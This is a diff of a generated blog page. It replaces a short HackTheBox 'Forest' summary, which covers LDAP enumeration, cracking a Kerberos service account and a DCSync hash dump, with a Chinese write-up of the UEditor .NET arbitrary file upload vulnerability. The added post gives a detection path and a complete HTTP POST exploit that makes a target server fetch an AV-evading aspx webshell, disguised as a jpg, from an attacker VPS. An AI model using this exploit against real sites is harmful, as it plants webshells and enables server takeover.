@@ -9,8 +9,8 @@
   <head>
     <meta charset="utf-8">
 
-<!-- begin _includes/seo.html --><title>HackTheBox - Forest - Yueyejian’s Blog</title>
-<meta name="description" content="HackTheBox - Forest About Forest Forest in an easy difficulty Windows Domain Controller (DC), for a domain in which Exchange Server has been installed. The DC is found to allow anonymous LDAP binds, which is used to enumerate domain objects. The password for a service account with Kerberos pre-authentication disabled can be cracked to gain a foothold. The service account is found to be a member of the Account Operators group, which can be used to add users to privileged Exchange groups. The Exchange group membership is leveraged to gain DCSync privileges on the domain and dump the NTLM hashes.">
+<!-- begin _includes/seo.html --><title>Ueditor任意文件上传漏洞 - Yueyejian’s Blog</title>
+<meta name="description" content="Ueditor任意文件上传漏洞 0x00 漏洞概述 Ueditor是百度开发的一个网站编辑器，目前已经不对其进行后续开发和更新，该漏洞只存在于该编辑器的.net版本。其他的php、jsp、asp版本不受此UEditor的漏洞的影响。">
 
 
   <meta name="author" content="yueyejian">
@@ -22,26 +22,26 @@
 <meta property="og:type" content="article">
 <meta property="og:locale" content="en_US">
 <meta property="og:site_name" content="Yueyejian's Blog">
-<meta property="og:title" content="HackTheBox - Forest">
-<meta property="og:url" content="http://localhost:4000/hack-the-box/forest/">
+<meta property="og:title" content="Ueditor任意文件上传漏洞">
+<meta property="og:url" content="http://localhost:4000/vul/ueditor/">
 
 
-  <meta property="og:description" content="HackTheBox - Forest About Forest Forest in an easy difficulty Windows Domain Controller (DC), for a domain in which Exchange Server has been installed. The DC is found to allow anonymous LDAP binds, which is used to enumerate domain objects. The password for a service account with Kerberos pre-authentication disabled can be cracked to gain a foothold. The service account is found to be a member of the Account Operators group, which can be used to add users to privileged Exchange groups. The Exchange group membership is leveraged to gain DCSync privileges on the domain and dump the NTLM hashes.">
-
-
-
-
-
-
-
-  <meta property="article:published_time" content="2023-09-13T00:00:00+08:00">
+  <meta property="og:description" content="Ueditor任意文件上传漏洞 0x00 漏洞概述 Ueditor是百度开发的一个网站编辑器，目前已经不对其进行后续开发和更新，该漏洞只存在于该编辑器的.net版本。其他的php、jsp、asp版本不受此UEditor的漏洞的影响。">
 
 
 
 
 
 
-<link rel="canonical" href="http://localhost:4000/hack-the-box/forest/">
+
+  <meta property="article:published_time" content="2023-10-23T00:00:00+08:00">
+
+
+
+
+
+
+<link rel="canonical" href="http://localhost:4000/vul/ueditor/">
 
 
 
@@ -255,15 +255,15 @@
 
 
   <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
-    <meta itemprop="headline" content="HackTheBox - Forest">
-    <meta itemprop="description" content="HackTheBox - ForestAbout ForestForest in an easy difficulty Windows Domain Controller (DC), for a domain in which Exchange Server has been installed. The DC is found to allow anonymous LDAP binds, which is used to enumerate domain objects. The password for a service account with Kerberos pre-authentication disabled can be cracked to gain a foothold. The service account is found to be a member of the Account Operators group, which can be used to add users to privileged Exchange groups. The Exchange group membership is leveraged to gain DCSync privileges on the domain and dump the NTLM hashes.">
-    <meta itemprop="datePublished" content="2023-09-13T00:00:00+08:00">
+    <meta itemprop="headline" content="Ueditor任意文件上传漏洞">
+    <meta itemprop="description" content="Ueditor任意文件上传漏洞0x00 漏洞概述Ueditor是百度开发的一个网站编辑器，目前已经不对其进行后续开发和更新，该漏洞只存在于该编辑器的.net版本。其他的php、jsp、asp版本不受此UEditor的漏洞的影响。">
+    <meta itemprop="datePublished" content="2023-10-23T00:00:00+08:00">
     
 
     <div class="page__inner-wrap">
       
         <header>
-          <h1 id="page-title" class="page__title" itemprop="headline">HackTheBox - Forest
+          <h1 id="page-title" class="page__title" itemprop="headline">Ueditor任意文件上传漏洞
 </h1>
           
 
@@ -273,7 +273,7 @@
       <span class="page__meta-date">
         <i class="far fa-calendar-alt" aria-hidden="true"></i>
         
-        <time datetime="2023-09-13T00:00:00+08:00">September 13, 2023</time>
+        <time datetime="2023-10-23T00:00:00+08:00">October 23, 2023</time>
       </span>
     
 
@@ -286,7 +286,7 @@
       <span class="page__meta-readtime">
         <i class="far fa-clock" aria-hidden="true"></i>
         
-          1 minute read
+          less than 1 minute read
         
       </span>
     
@@ -301,16 +301,49 @@
           <aside class="sidebar__right ">
             <nav class="toc">
               <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> Contents</h4></header>
-              <ul class="toc__menu"><li><a href="#hackthebox---forest">HackTheBox - Forest</a><ul><li><a href="#about-forest">About Forest</a></li></ul></li></ul>
+              <ul class="toc__menu"><li><a href="#ueditor任意文件上传漏洞">Ueditor任意文件上传漏洞</a><ul><li><a href="#0x00-漏洞概述">0x00 漏洞概述</a></li><li><a href="#0x01-poc">0x01 POC</a></li><li><a href="#0x02-漏洞利用">0x02 漏洞利用</a></li></ul></li></ul>
 
             </nav>
           </aside>
         
-        <h1 id="hackthebox---forest">HackTheBox - Forest</h1>
-<h2 id="about-forest">About Forest</h2>
-<p>Forest in an easy difficulty Windows Domain Controller (DC), for a domain in which Exchange Server has been installed. The DC is found to allow anonymous LDAP binds, which is used to enumerate domain objects. The password for a service account with Kerberos pre-authentication disabled can be cracked to gain a foothold. The service account is found to be a member of the Account Operators group, which can be used to add users to privileged Exchange groups. The Exchange group membership is leveraged to gain DCSync privileges on the domain and dump the NTLM hashes.</p>
+        <h1 id="ueditor任意文件上传漏洞">Ueditor任意文件上传漏洞</h1>
+<h2 id="0x00-漏洞概述">0x00 漏洞概述</h2>
+<p>Ueditor是百度开发的一个网站编辑器，目前已经不对其进行后续开发和更新，该漏洞只存在于该编辑器的.net版本。其他的php、jsp、asp版本不受此UEditor的漏洞的影响。</p>
 
-<p><img src="/images/hackthebox/forest/0.png" alt="" /></p>
+<h2 id="0x01-poc">0x01 POC</h2>
+<p>访问/ueditor/net/controller.ashx 控制器文件，当出现下图的时候表示编辑器成功运行，且漏洞存在。
+<img src="/images/vul/ueditor/1.png" alt="" /></p>
+
+<p>但也不一定，比如上图的路径为/scripts/ueditor/net/controller.ashx</p>
+
+<h2 id="0x02-漏洞利用">0x02 漏洞利用</h2>
+<p>现在vps上起一个http服务上面挂着一张jpg格式的aspx免杀马
+<img src="/images/vul/ueditor/2.png" alt="" /></p>
+
+<p>Expoliet:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /vul_ip/UEditor/net/controller.ashx?action=catchimage HTTP/1.1
+Host: x.x.x.x
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+sec-ch-ua-platform: "Windows"
+sec-ch-ua: "Google Chrome";v="100", "Chromium";v="100", "Not=A?Brand";v="24"
+sec-ch-ua-mobile: ?0
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 49
+
+source[]=http://vps_ip/666.jpg?.aspx
+</code></pre></div></div>
+
+<p>抓包修改参数，上传成功</p>
+
+<p><img src="/images/vul/ueditor/3.png" alt="" /></p>
+
+<p><img src="/images/vul/ueditor/4.png" alt="" /></p>
+
 
         
       </section>
@@ -327,9 +360,9 @@
     <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
     <span itemprop="keywords">
     
-      <a href="/tags/#active-directory" class="page__taxonomy-item" rel="tag">active-directory</a><span class="sep">, </span>
+      <a href="/tags/#nday" class="page__taxonomy-item" rel="tag">nday</a><span class="sep">, </span>
     
-      <a href="/tags/#windows" class="page__taxonomy-item" rel="tag">windows</a>
+      <a href="/tags/#ueditor" class="page__taxonomy-item" rel="tag">ueditor</a>
     
     </span>
   </p>
@@ -346,7 +379,7 @@
     <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
     <span itemprop="keywords">
     
-      <a href="/categories/#hack-the-box" class="page__taxonomy-item" rel="tag">hack-the-box</a>
+      <a href="/categories/#vul" class="page__taxonomy-item" rel="tag">vul</a>
     
     </span>
   </p>
@@ -354,7 +387,7 @@
 
         
 
-  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2023-09-13T00:00:00+08:00">September 13, 2023</time></p>
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2023-10-23T00:00:00+08:00">October 23, 2023</time></p>
 
 
       </footer>
@@ -364,12 +397,11 @@
       
   <nav class="pagination">
     
-      <a href="/hack-the-box/legacy-blue/" class="pagination--pager" title="HackTheBox - Legacy &amp;&amp; Blue
+      <a href="/vul/finereport/" class="pagination--pager" title="帆软V8文件上传漏洞
 ">Previous</a>
     
     
-      <a href="/vul/finereport/" class="pagination--pager" title="帆软V8文件上传漏洞
-">Next</a>
+      <a href="#" class="pagination--pager disabled">Next</a>
     
   </nav>
 
